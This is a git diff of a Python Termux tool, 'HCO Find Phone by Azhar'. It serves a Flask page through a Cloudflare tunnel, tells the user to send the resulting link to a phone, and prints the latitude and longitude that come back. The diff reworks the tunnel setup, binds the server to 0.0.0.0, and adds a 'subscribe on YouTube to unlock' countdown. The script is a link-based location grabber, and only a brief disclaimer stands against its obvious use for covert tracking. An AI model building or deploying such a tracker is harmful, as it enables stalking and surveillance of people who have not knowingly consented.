@@ -1,19 +1,18 @@
 # HCO Find Phone by Azhar
-# GitHub-ready Termux tool
+# Termux-ready, clean, professional
 # -------------------------------------------
-# Ethical use only. Only track devices you own or have permission for.
+# Ethical use only. Track only devices you own or have permission for.
 
 import os
 import threading
 import time
-import json
-import subprocess
 from flask import Flask, request
-import webbrowser
 
 # --------------------------- Terminal Colors ----------------------------
 RED = "\033[91m"
 GREEN = "\033[92m"
+YELLOW = "\033[93m"
+CYAN = "\033[96m"
 RESET = "\033[0m"
 CLEAR = "\033[2J\033[H"
 
@@ -37,70 +36,53 @@ def show_location():
     return "Waiting for device location..."
 
 def start_server():
-    app.run(host='127.0.0.1', port=5000)
+    app.run(host='0.0.0.0', port=5000)
 
-# ------------------------ Cloudflare Tunnel -----------------------------
-def start_tunnel():
-    # Start cloudflared tunnel automatically
-    print(f"{GREEN}Starting Cloudflare Tunnel...{RESET}")
-    tunnel_process = subprocess.Popen(
-        ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
-    # Wait a few seconds for tunnel to generate
-    time.sleep(5)
-    # Get tunnel URL
-    result = subprocess.run(
-        ["cloudflared", "tunnel", "list", "--output", "json"],
-        stdout=subprocess.PIPE
-    )
-    try:
-        tunnels = json.loads(result.stdout)
-        if len(tunnels) > 0:
-            url = tunnels[0]['TunnelURL']
-            return url
-    except Exception:
-        pass
-    return "CLOUDFLARE_LINK_NOT_FOUND"
-
-# ------------------------ Tool Lock & YouTube Redirect -----------------
-def lock_tool():
-    print(f"{RED}\n🔒 Tool is locked! To unlock, subscribe and click the bell 🔔{RESET}")
+# --------------------------- Tool Lock & Countdown ----------------------
+def tool_lock():
+    os.system(CLEAR)
+    print(f"{RED}{'='*80}")
+    print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}")
+    print(f"{RED}{'To unlock, SUBSCRIBE and click the BELL icon on YouTube 🔔'.center(80)}")
+    print(f"{RED}{'='*80}{RESET}\n")
+    print(f"{YELLOW}{'Redirecting in:'.center(80)}{RESET}\n")
+    
     for i in range(9, 0, -1):
-        print(f"{GREEN}{i}{RESET}...", end='', flush=True)
+        print(f"{CYAN}{str(i).center(80)}{RESET}")
         time.sleep(1)
-    print("\nOpening YouTube...")
-    webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
-    input("\nPress Enter after returning from YouTube...")
+    
+    print(f"\n{GREEN}{'OPEN THIS LINK IN YOUTUBE APP:'.center(80)}{RESET}")
+    print(f"{GREEN}{'https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya'.center(80)}{RESET}\n")
+    input(f"{YELLOW}{'Press ENTER after returning from YouTube...'.center(80)}{RESET}")
 
-# --------------------------- Display Dashboard --------------------------
+# --------------------------- Dashboard --------------------------
 def show_dashboard(cloudflare_link):
     os.system(CLEAR)
-    print(f"{RED}\n\n\n\n{'HCO Find Phone by Azhar'.center(80)}{RESET}\n")
+    print(f"{RED}{'='*80}")
+    print(f"{RED}{'HCO FIND PHONE BY AZHAR'.center(80)}")
+    print(f"{RED}{'='*80}{RESET}\n")
     print(f"{GREEN}{'Send this link to the phone to track location:'.center(80)}{RESET}\n")
     print(f"{GREEN}{cloudflare_link.center(80)}{RESET}\n")
+    print(f"{CYAN}{'Waiting for live location updates...'.center(80)}{RESET}\n")
 
-# --------------------------- Main Execution -----------------------------
+# --------------------------- Main --------------------------
 if __name__ == "__main__":
     # Start Flask server in background
     threading.Thread(target=start_server, daemon=True).start()
+    
+    # Show tool lock with countdown and YouTube instruction
+    tool_lock()
+    
+    # ---------------- Cloudflare Tunnel ------------------
+    print(f"{YELLOW}{'NOTE: Start your cloudflared tunnel manually in another Termux session:'.center(80)}{RESET}")
+    print(f"{CYAN}{'cloudflared tunnel --url http://127.0.0.1:5000'.center(80)}{RESET}\n")
+    cloudflare_link = input(f"{GREEN}{'Enter your Cloudflare public URL here: '.center(80)}{RESET}")
 
-    # Show tool lock & YouTube redirect
-    lock_tool()
+    # Show dashboard
+    show_dashboard(cloudflare_link)
 
-    # Start Cloudflare tunnel and get live link
-    link = start_tunnel()
-    if link == "CLOUDFLARE_LINK_NOT_FOUND":
-        print(f"{RED}Error: Could not start Cloudflare tunnel. Make sure cloudflared is installed.{RESET}")
-        exit()
-
-    # Show dashboard with live link
-    show_dashboard(link)
-
-    # Display live location updates
-    print(f"{GREEN}Waiting for live location updates...{RESET}")
+    # Live location updates
     while True:
         if 'lat' in locations and 'lon' in locations:
-            print(f"{GREEN}Live Location → Lat: {locations['lat']}, Lon: {locations['lon']}{RESET}")
+            print(f"{GREEN}{'LIVE LOCATION → Lat: ' + str(locations['lat']) + ', Lon: ' + str(locations['lon'])}{RESET}")
         time.sleep(3)
